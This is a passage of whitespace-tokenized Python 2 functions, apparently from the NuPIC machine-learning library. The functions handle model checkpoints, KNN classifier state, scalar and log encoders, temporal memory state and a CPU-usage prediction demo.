( ) ) , tuple ( header ) ) # Copy the rows from checkpoint numRowsCopied = 0 while True : try : row = reader . next ( ) except StopIteration : break #print "DEBUG: restoring row from checkpoint: %r" % (row,) self . __dataset . appendRecord ( row ) numRowsCopied += 1 self . __dataset . flush ( ) print "Restored %d rows from checkpoint for %r" % ( numRowsCopied , self . __datasetPath ) # Dispose of our checkpoint cache self . __checkpointCache . close ( ) self . __checkpointCache = None return
def __getDictMetaInfo ( self , inferenceElement , inferenceDict ) : fieldMetaInfo = [ ] inferenceLabel = InferenceElement . getLabel ( inferenceElement ) if InferenceElement . getInputElement ( inferenceElement ) : fieldMetaInfo . append ( FieldMetaInfo ( name = inferenceLabel + ".actual" , type = FieldMetaType . string , special = '' ) ) keys = sorted ( inferenceDict . keys ( ) ) for key in keys : fieldMetaInfo . append ( FieldMetaInfo ( name = inferenceLabel + "." + str ( key ) , type = FieldMetaType . string , special = '' ) ) return fieldMetaInfo
def modifyBits ( inputVal , maxChanges ) : changes = np . random . random_integers ( 0 , maxChanges , 1 ) [ 0 ] if changes == 0 : return inputVal inputWidth = len ( inputVal ) whatToChange = np . random . random_integers ( 0 , 41 , changes ) runningIndex = - 1 numModsDone = 0 for i in xrange ( inputWidth ) : if numModsDone >= changes : break if inputVal [ i ] == 1 : runningIndex += 1 if runningIndex in whatToChange : if i != 0 and inputVal [ i - 1 ] == 0 : inputVal [ i - 1 ] = 1 inputVal [ i ] = 0 return inputVal
def clean ( s ) : lines = [ l . rstrip ( ) for l in s . split ( '\n' ) ] return '\n' . join ( lines )
def main ( ) : initLogging ( verbose = True ) # Initialize PRNGs initExperimentPrng ( ) # Mock out the creation of the SDRClassifier. @ staticmethod def _mockCreate ( * args , * * kwargs ) : kwargs . pop ( 'implementation' , None ) return SDRClassifierDiff ( * args , * * kwargs ) SDRClassifierFactory . create = _mockCreate # Run it! runExperiment ( sys . argv [ 1 : ] )
def jobCancelAllRunningJobs ( self ) : # Get a database connection and cursor with ConnectionFactory . get ( ) as conn : query = 'UPDATE %s SET cancel=TRUE WHERE status<>%%s ' % ( self . jobsTableName , ) conn . cursor . execute ( query , [ self . STATUS_COMPLETED ] ) return
def _initEphemerals ( self ) : self . _firstComputeCall = True self . _accuracy = None self . _protoScores = None self . _categoryDistances = None self . _knn = knn_classifier . KNNClassifier ( * * self . knnParams ) for x in ( '_partitions' , '_useAuxiliary' , '_doSphering' , '_scanInfo' , '_protoScores' ) : if not hasattr ( self , x ) : setattr ( self , x , None )
def disableTap ( self ) : if self . _tapFileIn is not None : self . _tapFileIn . close ( ) self . _tapFileIn = None if self . _tapFileOut is not None : self . _tapFileOut . close ( ) self . _tapFileOut = None
def _storeSample ( self , inputVector , trueCatIndex , partition = 0 ) : # If this is the first sample, then allocate a numpy array # of the appropriate size in which to store all samples. if self . _samples is None : self . _samples = numpy . zeros ( ( 0 , len ( inputVector ) ) , dtype = RealNumpyDType ) assert self . _labels is None self . _labels = [ ] # Add the sample vector and category lable self . _samples = numpy . concatenate ( ( self . _samples , numpy . atleast_2d ( inputVector ) ) , axis = 0 ) self . _labels += [ trueCatIndex ] # Add the partition ID if self . _partitions is None : self . _partitions = [ ] if partition is None : partition = 0 self . _partitions += [ partition ]
def _finishLearning ( self ) : if self . _doSphering : self . _finishSphering ( ) self . _knn . finishLearning ( ) # Compute leave-one-out validation accuracy if # we actually received non-trivial partition info self . _accuracy = None
def next ( self , newValue ) : newAverage , self . slidingWindow , self . total = self . compute ( self . slidingWindow , self . total , newValue , self . windowSize ) return newAverage
def addInstance ( self , groundTruth , prediction , record = None , result = None ) : self . value = self . avg ( prediction )
def _getInputValue ( self , obj , fieldName ) : if isinstance ( obj , dict ) : if not fieldName in obj : knownFields = ", " . join ( key for key in obj . keys ( ) if not key . startswith ( "_" ) ) raise ValueError ( "Unknown field name '%s' in input record. Known fields are '%s'.\n" "This could be because input headers are mislabeled, or because " "input data rows do not contain a value for '%s'." % ( fieldName , knownFields , fieldName ) ) return obj [ fieldName ] else : return getattr ( obj , fieldName )
def createInput ( self ) : print "-" * 70 + "Creating a random input vector" + "-" * 70 #clear the inputArray to zero before creating a new input vector self . inputArray [ 0 : ] = 0 for i in range ( self . inputSize ) : #randrange returns 0 or 1 self . inputArray [ i ] = random . randrange ( 2 )
def run ( self ) : print "-" * 80 + "Computing the SDR" + "-" * 80 #activeArray[column]=1 if column is active after spatial pooling self . sp . compute ( self . inputArray , True , self . activeArray ) print self . activeArray . nonzero ( )
def clear ( self ) : self . _Memory = None self . _numPatterns = 0 self . _M = None self . _categoryList = [ ] self . _partitionIdList = [ ] self . _partitionIdMap = { } self . _finishedLearning = False self . _iterationIdx = - 1 # Fixed capacity KNN if self . maxStoredPatterns > 0 : assert self . useSparseMemory , ( "Fixed capacity KNN is implemented only " "in the sparse memory mode" ) self . fixedCapacity = True self . _categoryRecencyList = [ ] else : self . fixedCapacity = False # Cached value of the store prototype sizes self . _protoSizes = None # Used by PCA self . _s = None self . _vt = None self . _nc = None self . _mean = None # Used by Network Builder self . _specificIndexTraining = False self . _nextTrainingIndices = None
def _addPartitionId ( self , index , partitionId = None ) : if partitionId is None : self . _partitionIdList . append ( numpy . inf ) else : self . _partitionIdList . append ( partitionId ) indices = self . _partitionIdMap . get ( partitionId , [ ] ) indices . append ( index ) self . _partitionIdMap [ partitionId ] = indices
def _rebuildPartitionIdMap ( self , partitionIdList ) : self . _partitionIdMap = { } for row , partitionId in enumerate ( partitionIdList ) : indices = self . _partitionIdMap . get ( partitionId , [ ] ) indices . append ( row ) self . _partitionIdMap [ partitionId ] = indices
def rewind ( self ) : # Superclass rewind super ( FileRecordStream , self ) . rewind ( ) self . close ( ) self . _file = open ( self . _filename , self . _mode ) self . _reader = csv . reader ( self . _file , dialect = "excel" ) # Skip header rows self . _reader . next ( ) self . _reader . next ( ) self . _reader . next ( ) # Reset record count, etc. self . _recordCount = 0
def _getStartRow ( self , bookmark ) : bookMarkDict = json . loads ( bookmark ) realpath = os . path . realpath ( self . _filename ) bookMarkFile = bookMarkDict . get ( 'filepath' , None ) if bookMarkFile != realpath : print ( "Ignoring bookmark due to mismatch between File's " "filename realpath vs. bookmark; realpath: %r; bookmark: %r" ) % ( realpath , bookMarkDict ) return 0 else : return bookMarkDict [ 'currentRow' ]
def getCustomDict ( cls ) : if not os . path . exists ( cls . getPath ( ) ) : return dict ( ) properties = Configuration . _readConfigFile ( os . path . basename ( cls . getPath ( ) ) , os . path . dirname ( cls . getPath ( ) ) ) values = dict ( ) for propName in properties : if 'value' in properties [ propName ] : values [ propName ] = properties [ propName ] [ 'value' ] return values
def _setPath ( cls ) : cls . _path = os . path . join ( os . environ [ 'NTA_DYNAMIC_CONF_DIR' ] , cls . customFileName )
def __advancePhase ( self ) : self . __currentPhase = self . __phaseCycler . next ( ) self . __currentPhase . enterPhase ( ) return
def _aggr_mean ( inList ) : aggrSum = 0 nonNone = 0 for elem in inList : if elem != SENTINEL_VALUE_FOR_MISSING_DATA : aggrSum += elem nonNone += 1 if nonNone != 0 : return aggrSum / nonNone else : return None
def _aggr_mode ( inList ) : valueCounts = dict ( ) nonNone = 0 for elem in inList : if elem == SENTINEL_VALUE_FOR_MISSING_DATA : continue nonNone += 1 if elem in valueCounts : valueCounts [ elem ] += 1 else : valueCounts [ elem ] = 1 # Get the most common one if nonNone == 0 : return None # Sort by counts sortedCounts = valueCounts . items ( ) sortedCounts . sort ( cmp = lambda x , y : x [ 1 ] - y [ 1 ] , reverse = True ) return sortedCounts [ 0 ] [ 0 ]
def writeToCheckpoint ( self , checkpointDir ) : proto = self . getSchema ( ) . new_message ( ) self . write ( proto ) checkpointPath = self . _getModelCheckpointFilePath ( checkpointDir ) # Clean up old saved state, if any if os . path . exists ( checkpointDir ) : if not os . path . isdir ( checkpointDir ) : raise Exception ( ( "Existing filesystem entry <%s> is not a model" " checkpoint -- refusing to delete (not a directory)" ) % checkpointDir ) if not os . path . isfile ( checkpointPath ) : raise Exception ( ( "Existing filesystem entry <%s> is not a model" " checkpoint -- refusing to delete" " (%s missing or not a file)" ) % ( checkpointDir , checkpointPath ) ) shutil . rmtree ( checkpointDir ) # Create a new directory for saving state self . __makeDirectoryFromAbsolutePath ( checkpointDir ) with open ( checkpointPath , 'wb' ) as f : proto . write ( f )
def readFromCheckpoint ( cls , checkpointDir ) : checkpointPath = cls . _getModelCheckpointFilePath ( checkpointDir ) with open ( checkpointPath , 'r' ) as f : proto = cls . getSchema ( ) . read ( f , traversal_limit_in_words = _TRAVERSAL_LIMIT_IN_WORDS ) model = cls . read ( proto ) return model
def _reportCommandLineUsageErrorAndExit ( parser , message ) : print parser . get_usage ( ) print message sys . exit ( 1 )
def _isCheckpointDir ( checkpointDir ) : lastSegment = os . path . split ( checkpointDir ) [ 1 ] if lastSegment [ 0 ] == '.' : return False if not checkpointDir . endswith ( g_defaultCheckpointExtension ) : return False if not os . path . isdir ( checkpointDir ) : return False return True
def _printAvailableCheckpoints ( experimentDir ) : checkpointParentDir = getCheckpointParentDir ( experimentDir ) if not os . path . exists ( checkpointParentDir ) : print "No available checkpoints." return checkpointDirs = [ x for x in os . listdir ( checkpointParentDir ) if _isCheckpointDir ( os . path . join ( checkpointParentDir , x ) ) ] if not checkpointDirs : print "No available checkpoints." return print "Available checkpoints:" checkpointList = [ _checkpointLabelFromCheckpointDir ( x ) for x in checkpointDirs ] for checkpoint in sorted ( checkpointList ) : print "\t" , checkpoint print print "To start from a checkpoint:" print "  python run_opf_experiment.py experiment --load <CHECKPOINT>" print "For example, to start from the checkpoint \"MyCheckpoint\":" print "  python run_opf_experiment.py experiment --load MyCheckpoint"
def run ( self ) : self . __logger . debug ( "run(): Starting task <%s>" , self . __task [ 'taskLabel' ] ) # Set up the task # Create our main loop-control iterator if self . __cmdOptions . privateOptions [ 'testMode' ] : numIters = 10 else : numIters = self . __task [ 'iterationCount' ] if numIters >= 0 : iterTracker = iter ( xrange ( numIters ) ) else : iterTracker = iter ( itertools . count ( ) ) # Initialize periodic activities periodic = PeriodicActivityMgr ( requestedActivities = self . _createPeriodicActivities ( ) ) # Reset sequence states in the model, so it starts looking for a new # sequence # TODO: should this be done in OPFTaskDriver.setup(), instead?  Is it always #       desired in Nupic? self . __model . resetSequenceStates ( ) # Have Task Driver perform its initial setup activities, including setup # callbacks self . __taskDriver . setup ( ) # Run it! while True : # Check controlling iterator first try : next ( iterTracker ) except StopIteration : break # Read next input record try : inputRecord = self . __datasetReader . next ( ) except StopIteration : break # Process input record result = self . __taskDriver . handleInputRecord ( inputRecord = inputRecord ) if InferenceElement . encodings in result . inferences : result . inferences . pop ( InferenceElement . encodings ) self . __predictionLogger . writeRecord ( result ) # Run periodic activities periodic . tick ( ) # Dump the experiment metrics at the end of the task self . _getAndEmitExperimentMetrics ( final = True ) # Have Task Driver perform its final activities self . __taskDriver . finalize ( ) # Reset sequence states in the model, so it starts looking for a new # sequence # TODO: should this be done in OPFTaskDriver.setup(), instead?  Is it always #       desired in Nupic? self . __model . resetSequenceStates ( )
def encodeIntoArray ( self , inputVal , outputVal ) : if len ( inputVal ) != len ( outputVal ) : raise ValueError ( "Different input (%i) and output (%i) sizes." % ( len ( inputVal ) , len ( outputVal ) ) ) if self . w is not None and sum ( inputVal ) != self . w : raise ValueError ( "Input has %i bits but w was set to %i." % ( sum ( inputVal ) , self . w ) ) outputVal [ : ] = inputVal [ : ] if self . verbosity >= 2 : print "input:" , inputVal , "output:" , outputVal print "decoded:" , self . decodedToStr ( self . decode ( outputVal ) )
def decode ( self , encoded , parentFieldName = "" ) : if parentFieldName != "" : fieldName = "%s.%s" % ( parentFieldName , self . name ) else : fieldName = self . name return ( { fieldName : ( [ [ 0 , 0 ] ] , "input" ) } , [ fieldName ] )
def getBucketInfo ( self , buckets ) : return [ EncoderResult ( value = 0 , scalar = 0 , encoding = numpy . zeros ( self . n ) ) ]
def topDownCompute ( self , encoded ) : return EncoderResult ( value = 0 , scalar = 0 , encoding = numpy . zeros ( self . n ) )
def _genLoggingFilePath ( ) : appName = os . path . splitext ( os . path . basename ( sys . argv [ 0 ] ) ) [ 0 ] or 'UnknownApp' appLogDir = os . path . abspath ( os . path . join ( os . environ [ 'NTA_LOG_DIR' ] , 'numenta-logs-%s' % ( os . environ [ 'USER' ] , ) , appName ) ) appLogFileName = '%s-%s-%s.log' % ( appName , long ( time . mktime ( time . gmtime ( ) ) ) , os . getpid ( ) ) return os . path . join ( appLogDir , appLogFileName )
def _getScaledValue ( self , inpt ) : if inpt == SENTINEL_VALUE_FOR_MISSING_DATA : return None else : val = inpt if val < self . minval : val = self . minval elif val > self . maxval : val = self . maxval scaledVal = math . log10 ( val ) return scaledVal
def getBucketIndices ( self , inpt ) : # Get the scaled value scaledVal = self . _getScaledValue ( inpt ) if scaledVal is None : return [ None ] else : return self . encoder . getBucketIndices ( scaledVal )
def encodeIntoArray ( self , inpt , output ) : # Get the scaled value scaledVal = self . _getScaledValue ( inpt ) if scaledVal is None : output [ 0 : ] = 0 else : self . encoder . encodeIntoArray ( scaledVal , output ) if self . verbosity >= 2 : print "input:" , inpt , "scaledVal:" , scaledVal , "output:" , output print "decoded:" , self . decodedToStr ( self . decode ( output ) )
def decode ( self , encoded , parentFieldName = '' ) : # Get the scalar values from the underlying scalar encoder ( fieldsDict , fieldNames ) = self . encoder . decode ( encoded ) if len ( fieldsDict ) == 0 : return ( fieldsDict , fieldNames ) # Expect only 1 field assert ( len ( fieldsDict ) == 1 ) # Convert each range into normal space ( inRanges , inDesc ) = fieldsDict . values ( ) [ 0 ] outRanges = [ ] for ( minV , maxV ) in inRanges : outRanges . append ( ( math . pow ( 10 , minV ) , math . pow ( 10 , maxV ) ) ) # Generate a text description of the ranges desc = "" numRanges = len ( outRanges ) for i in xrange ( numRanges ) : if outRanges [ i ] [ 0 ] != outRanges [ i ] [ 1 ] : desc += "%.2f-%.2f" % ( outRanges [ i ] [ 0 ] , outRanges [ i ] [ 1 ] ) else : desc += "%.2f" % ( outRanges [ i ] [ 0 ] ) if i < numRanges - 1 : desc += ", " # Return result if parentFieldName != '' : fieldName = "%s.%s" % ( parentFieldName , self . name ) else : fieldName = self . name return ( { fieldName : ( outRanges , desc ) } , [ fieldName ] )
def getBucketValues ( self ) : # Need to re-create? if self . _bucketValues is None : scaledValues = self . encoder . getBucketValues ( ) self . _bucketValues = [ ] for scaledValue in scaledValues : value = math . pow ( 10 , scaledValue ) self . _bucketValues . append ( value ) return self . _bucketValues
def getBucketInfo ( self , buckets ) : scaledResult = self . encoder . getBucketInfo ( buckets ) [ 0 ] scaledValue = scaledResult . value value = math . pow ( 10 , scaledValue ) return [ EncoderResult ( value = value , scalar = value , encoding = scaledResult . encoding ) ]
def topDownCompute ( self , encoded ) : scaledResult = self . encoder . topDownCompute ( encoded ) [ 0 ] scaledValue = scaledResult . value value = math . pow ( 10 , scaledValue ) return EncoderResult ( value = value , scalar = value , encoding = scaledResult . encoding )
def closenessScores ( self , expValues , actValues , fractional = True ) : # Compute the percent error in log space if expValues [ 0 ] > 0 : expValue = math . log10 ( expValues [ 0 ] ) else : expValue = self . minScaledValue if actValues [ 0 ] > 0 : actValue = math . log10 ( actValues [ 0 ] ) else : actValue = self . minScaledValue if fractional : err = abs ( expValue - actValue ) pctErr = err / ( self . maxScaledValue - self . minScaledValue ) pctErr = min ( 1.0 , pctErr ) closeness = 1.0 - pctErr else : err = abs ( expValue - actValue ) closeness = err #print "log::", "expValue:", expValues[0], "actValue:", actValues[0], \ #      "closeness", closeness #import pdb; pdb.set_trace() return numpy . array ( [ closeness ] )
def bitsToString ( arr ) : s = array ( 'c' , '.' * len ( arr ) ) for i in xrange ( len ( arr ) ) : if arr [ i ] == 1 : s [ i ] = '*' return s
def runCPU ( ) : # Create the model for predicting CPU usage. model = ModelFactory . create ( model_params . MODEL_PARAMS ) model . enableInference ( { 'predictedField' : 'cpu' } ) # The shifter will align prediction and actual values. shifter = InferenceShifter ( ) # Keep the last WINDOW predicted and actual values for plotting. actHistory = deque ( [ 0.0 ] * WINDOW , maxlen = 60 ) predHistory = deque ( [ 0.0 ] * WINDOW , maxlen = 60 ) # Initialize the plot lines that we will update with each new record. actline , = plt . plot ( range ( WINDOW ) , actHistory ) predline , = plt . plot ( range ( WINDOW ) , predHistory ) # Set the y-axis range. actline . axes . set_ylim ( 0 , 100 ) predline . axes . set_ylim ( 0 , 100 ) while True : s = time . time ( ) # Get the CPU usage. cpu = psutil . cpu_percent ( ) # Run the input through the model and shift the resulting prediction. modelInput = { 'cpu' : cpu } result = shifter . shift ( model . run ( modelInput ) ) # Update the trailing predicted and actual value deques. inference = result . inferences [ 'multiStepBestPredictions' ] [ 5 ] if inference is not None : actHistory . append ( result . rawInput [ 'cpu' ] ) predHistory . append ( inference ) # Redraw the chart with the new data. actline . set_ydata ( actHistory ) # update the data predline . set_ydata ( predHistory ) # update the data plt . draw ( ) plt . legend ( ( 'actual' , 'predicted' ) ) # Make sure we wait a total of 2 seconds per iteration. try : plt . pause ( SECONDS_PER_STEP ) except : pass
def _extractCallingMethodArgs ( ) : import inspect import copy callingFrame = inspect . stack ( ) [ 1 ] [ 0 ] argNames , _ , _ , frameLocalVarDict = inspect . getargvalues ( callingFrame ) argNames . remove ( "self" ) args = copy . copy ( frameLocalVarDict ) for varName in frameLocalVarDict : if varName not in argNames : args . pop ( varName ) return args
def _getEphemeralMembers ( self ) : e = BacktrackingTM . _getEphemeralMembers ( self ) if self . makeCells4Ephemeral : e . extend ( [ 'cells4' ] ) return e
def _initEphemerals ( self ) : BacktrackingTM . _initEphemerals ( self ) #--------------------------------------------------------------------------------- # cells4 specific initialization # If True, let C++ allocate memory for activeState, predictedState, and # learnState. In this case we can retrieve copies of these states but can't # set them directly from Python. If False, Python can allocate them as # numpy arrays and we can pass pointers to the C++ using setStatePointers self . allocateStatesInCPP = False # Set this to true for debugging or accessing learning states self . retrieveLearningStates = False if self . makeCells4Ephemeral : self . _initCells4 ( )
def _copyAllocatedStates ( self ) : # Get learn states if we need to print them out if self . verbosity > 1 or self . retrieveLearningStates : ( activeT , activeT1 , predT , predT1 ) = self . cells4 . getLearnStates ( ) self . lrnActiveState [ 't-1' ] = activeT1 . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . lrnActiveState [ 't' ] = activeT . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . lrnPredictedState [ 't-1' ] = predT1 . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . lrnPredictedState [ 't' ] = predT . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) if self . allocateStatesInCPP : assert False ( activeT , activeT1 , predT , predT1 , colConfidenceT , colConfidenceT1 , confidenceT , confidenceT1 ) = self . cells4 . getStates ( ) self . cellConfidence [ 't' ] = confidenceT . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . cellConfidence [ 't-1' ] = confidenceT1 . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . colConfidence [ 't' ] = colConfidenceT . reshape ( self . numberOfCols ) self . colConfidence [ 't-1' ] = colConfidenceT1 . reshape ( self . numberOfCols ) self . infActiveState [ 't-1' ] = activeT1 . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . infActiveState [ 't' ] = activeT . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . infPredictedState [ 't-1' ] = predT1 . reshape ( ( self . numberOfCols , self . cellsPerColumn ) ) self . infPredictedState [ 't' ] = predT . reshape ( ( self . numberOfCols , self . cellsPerColumn ) )
def getBucketIndices ( self , x ) : if ( ( isinstance ( x , float ) and math . isnan ( x ) ) or x == SENTINEL_VALUE_FOR_MISSING_DATA ) : return [ None ] if self . _offset is None : self . _offset = x bucketIdx = ( ( self . _maxBuckets / 2 ) + int ( round ( ( x - self . _offset ) / self . resolution ) ) ) if bucketIdx < 0 : bucketIdx = 0 elif bucketIdx >= self . _maxBuckets : bucketIdx = self . _maxBuckets - 1 return [ bucketIdx ]
def encodeIntoArray ( self , x , output ) : if x is not None and not isinstance ( x , numbers . Number ) : raise TypeError ( "Expected a scalar input but got input of type %s" % type ( x ) ) # Get the bucket index to use bucketIdx = self . getBucketIndices ( x ) [ 0 ] # None is returned for missing value in which case we return all 0's. output [ 0 : self . n ] = 0 if bucketIdx is not None : output [ self . mapBucketIndexToNonZeroBits ( bucketIdx ) ] = 1
def _countOverlapIndices ( self , i , j ) : if self . bucketMap . has_key ( i ) and self . bucketMap . has_key ( j ) : iRep = self . bucketMap [ i ] jRep = self . bucketMap [ j ] return self . _countOverlap ( iRep , jRep ) else : raise ValueError ( "Either i or j don't exist" )
def _initializeBucketMap ( self , maxBuckets , offset ) : # The first bucket index will be _maxBuckets / 2 and bucket indices will be # allowed to grow lower or higher as long as they don't become negative. # _maxBuckets is required because the current SDR Classifier assumes bucket # indices must be non-negative. This normally does not need to be changed # but if altered, should be set to an even number. self . _maxBuckets = maxBuckets self . minIndex = self . _maxBuckets / 2 self . maxIndex = self . _maxBuckets / 2 # The scalar offset used to map scalar values to bucket indices. The middle # bucket will correspond to numbers in the range # [offset-resolution/2, offset+resolution/2). # The bucket index for a number x will be: #     maxBuckets/2 + int( round( (x-offset)/resolution ) ) self . _offset = offset # This dictionary maps a bucket index into its bit representation # We initialize the class with a single bucket with index 0 self . bucketMap = { } def _permutation ( n ) : r = numpy . arange ( n , dtype = numpy . uint32 ) self . random . shuffle ( r ) return r self . bucketMap [ self . minIndex ] = _permutation ( self . n ) [ 0 : self . w ] # How often we need to retry when generating valid encodings self . numTries = 0
def getBucketIndices ( self , input ) : if type ( input ) is float and math . isnan ( input ) : input = SENTINEL_VALUE_FOR_MISSING_DATA if input == SENTINEL_VALUE_FOR_MISSING_DATA : return [ None ] minbin = self . _getFirstOnBit ( input ) [ 0 ] # For periodic encoders, the bucket index is the index of the center bit if self . periodic : bucketIdx = minbin + self . halfwidth if bucketIdx < 0 : bucketIdx += self . n # for non-periodic encoders, the bucket index is the index of the left bit else : bucketIdx = minbin return [ bucketIdx ]
def encodeIntoArray ( self , input , output , learn = True ) : if input is not None and not isinstance ( input , numbers . Number ) : raise TypeError ( "Expected a scalar input but got input of type %s" % type ( input ) ) if type ( input ) is float and math . isnan ( input ) : input = SENTINEL_VALUE_FOR_MISSING_DATA # Get the bucket index to use bucketIdx = self . _getFirstOnBit ( input ) [ 0 ] if bucketIdx is None : # None is returned for missing value output [ 0 : self . n ] = 0 #TODO: should all 1s, or random SDR be returned instead? else : # The bucket index is the index of the first bit to set in the output output [ : self . n ] = 0 minbin = bucketIdx maxbin = minbin + 2 * self . halfwidth if self . periodic : # Handle the edges by computing wrap-around if maxbin >= self . n : bottombins = maxbin - self . n + 1 output [ : bottombins ] = 1 maxbin = self . n - 1 if minbin < 0 : topbins = - minbin output [ self . n - topbins : self . n ] = 1 minbin = 0 assert minbin >= 0 assert maxbin < self . n # set the output (except for periodic wraparound) output [ minbin : maxbin + 1 ] = 1 # Debug the decode() method if self . verbosity >= 2 : print print "input:" , input print "range:" , self . minval , "-" , self . maxval print "n:" , self . n , "w:" , self . w , "resolution:" , self . resolution , "radius" , self . radius , "periodic:" , self . periodic print "output:" , self . pprint ( output ) print "input desc:" , self . decodedToStr ( self . decode ( output ) )
def decode ( self , encoded , parentFieldName = '' ) : # For now, we simply assume any top-down output greater than 0 #  is ON. Eventually, we will probably want to incorporate the strength #  of each top-down output. tmpOutput = numpy . array ( encoded [ : self . n ] > 0 ) . astype ( encoded . dtype ) if not tmpOutput . any ( ) : return ( dict ( ) , [ ] ) # ------------------------------------------------------------------------ # First, assume the input pool is not sampled 100%, and fill in the #  "holes" in the encoded representation (which are likely to be present #  if this is a coincidence that was learned by the SP). # Search for portions of the output that have "holes" maxZerosInARow = self . halfwidth for i in xrange ( maxZerosInARow ) : searchStr = numpy . ones ( i + 3 , dtype = encoded . dtype ) searchStr [ 1 : - 1 ] = 0 subLen = len ( searchStr ) # Does this search string appear in the output? if self . periodic : for j in xrange ( self . n ) : outputIndices = numpy . arange ( j , j + subLen ) outputIndices %= self . n if numpy . array_equal ( searchStr , tmpOutput [ outputIndices ] ) : tmpOutput [ outputIndices ] = 1 else : for j in xrange ( self . n - subLen + 1 ) : if numpy . array_equal ( searchStr , tmpOutput [ j : j + subLen ] ) : tmpOutput [ j : j + subLen ] = 1 if self . verbosity >= 2 : print "raw output:" , encoded [ : self . n ] print "filtered output:" , tmpOutput # ------------------------------------------------------------------------ # Find each run of 1's. nz = tmpOutput . nonzero ( ) [ 0 ] runs = [ ] # will be tuples of (startIdx, runLength) run = [ nz [ 0 ] , 1 ] i = 1 while ( i < len ( nz ) ) : if nz [ i ] == run [ 0 ] + run [ 1 ] : run [ 1 ] += 1 else : runs . append ( run ) run = [ nz [ i ] , 1 ] i += 1 runs . append ( run ) # If we have a periodic encoder, merge the first and last run if they #  both go all the way to the edges if self . periodic and len ( runs ) > 1 : if runs [ 0 ] [ 0 ] == 0 and runs [ - 1 ] [ 0 ] + runs [ - 1 ] [ 1 ] == self . n : runs [ - 1 ] [ 1 ] += runs [ 0 ] [ 1 ] runs = runs [ 1 : ] # ------------------------------------------------------------------------ # Now, for each group of 1's, determine the "left" and "right" edges, where #  the "left" edge is inset by halfwidth and the "right" edge is inset by #  halfwidth. # For a group of width w or less, the "left" and "right" edge are both at #   the center position of the group. ranges = [ ] for run in runs : ( start , runLen ) = run if runLen <= self . w : left = right = start + runLen / 2 else : left = start + self . halfwidth right = start + runLen - 1 - self . halfwidth # Convert to input space. if not self . periodic : inMin = ( left - self . padding ) * self . resolution + self . minval inMax = ( right - self . padding ) * self . resolution + self . minval else : inMin = ( left - self . padding ) * self . range / self . nInternal + self . minval inMax = ( right - self . padding ) * self . range / self . nInternal + self . minval # Handle wrap-around if periodic if self . periodic : if inMin >= self . maxval : inMin -= self . range inMax -= self . range # Clip low end if inMin < self . minval : inMin = self . minval if inMax < self . minval : inMax = self . minval # If we have a periodic encoder, and the max is past the edge, break into #  2 separate ranges if self . periodic and inMax >= self . maxval : ranges . append ( [ inMin , self . maxval ] ) ranges . append ( [ self . minval , inMax - self . range ] ) else : if inMax > self . maxval : inMax = self . maxval if inMin > self . maxval : inMin = self . maxval ranges . append ( [ inMin , inMax ] ) desc = self . _generateRangeDescription ( ranges ) # Return result if parentFieldName != '' : fieldName = "%s.%s" % ( parentFieldName , self . name ) else : fieldName = self . name return ( { fieldName : ( ranges , desc ) } , [ fieldName ] )
def _generateRangeDescription ( self , ranges ) : desc = "" numRanges = len ( ranges ) for i in xrange ( numRanges ) : if ranges [ i ] [ 0 ] != ranges [ i ] [ 1 ] : desc += "%.2f-%.2f" % ( ranges [ i ] [ 0 ] , ranges [ i ] [ 1 ] ) else : desc += "%.2f" % ( ranges [ i ] [ 0 ] ) if i < numRanges - 1 : desc += ", " return desc
def getBucketValues ( self ) : # Need to re-create? if self . _bucketValues is None : topDownMappingM = self . _getTopDownMapping ( ) numBuckets = topDownMappingM . nRows ( ) self . _bucketValues = [ ] for bucketIdx in range ( numBuckets ) : self . _bucketValues . append ( self . getBucketInfo ( [ bucketIdx ] ) [ 0 ] . value ) return self . _bucketValues
def getBucketInfo ( self , buckets ) : # Get/generate the topDown mapping table #NOTE: although variable topDownMappingM is unused, some (bad-style) actions #are executed during _getTopDownMapping() so this line must stay here topDownMappingM = self . _getTopDownMapping ( ) # The "category" is simply the bucket index category = buckets [ 0 ] encoding = self . _topDownMappingM . getRow ( category ) # Which input value does this correspond to? if self . periodic : inputVal = ( self . minval + ( self . resolution / 2.0 ) + ( category * self . resolution ) ) else : inputVal = self . minval + ( category * self . resolution ) return [ EncoderResult ( value = inputVal , scalar = inputVal , encoding = encoding ) ]
def topDownCompute ( self , encoded ) : # Get/generate the topDown mapping table topDownMappingM = self . _getTopDownMapping ( ) # See which "category" we match the closest. category = topDownMappingM . rightVecProd ( encoded ) . argmax ( ) # Return that bucket info return self . getBucketInfo ( [ category ] )
def closenessScores ( self , expValues , actValues , fractional = True ) : expValue = expValues [ 0 ] actValue = actValues [ 0 ] if self . periodic : expValue = expValue % self . maxval actValue = actValue % self . maxval err = abs ( expValue - actValue ) if self . periodic : err = min ( err , self . maxval - err ) if fractional : pctErr = float ( err ) / ( self . maxval - self . minval ) pctErr = min ( 1.0 , pctErr ) closeness = 1.0 - pctErr else : closeness = err return numpy . array ( [ closeness ] )
def _initEphemerals ( self ) : ## We store the lists of segments updates, per cell, so that they can be # applied later during learning, when the cell gets bottom-up activation. # We store one list per cell. The lists are identified with a hash key which # is a tuple (column index, cell index). self . segmentUpdates = { } # Allocate and reset all stats self . resetStats ( ) # NOTE: We don't use the same backtrack buffer for inference and learning # because learning has a different metric for determining if an input from # the past is potentially useful again for backtracking. # # Our inference backtrack buffer. This keeps track of up to # maxInfBacktrack of previous input. Each entry is a list of active column # inputs. self . _prevInfPatterns = [ ] # Our learning backtrack buffer. This keeps track of up to maxLrnBacktrack # of previous input. Each entry is a list of active column inputs self . _prevLrnPatterns = [ ] # Keep integers rather than bools. Float? stateShape = ( self . numberOfCols , self . cellsPerColumn ) self . lrnActiveState = { } self . lrnActiveState [ "t" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . lrnActiveState [ "t-1" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . lrnPredictedState = { } self . lrnPredictedState [ "t" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . lrnPredictedState [ "t-1" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infActiveState = { } self . infActiveState [ "t" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infActiveState [ "t-1" ] = numpy . zeros ( stateShape , dtype = "int8" ) self . infActiveState [ "backup" ] = numpy . zeros ( stateShape , dtype = "int8" 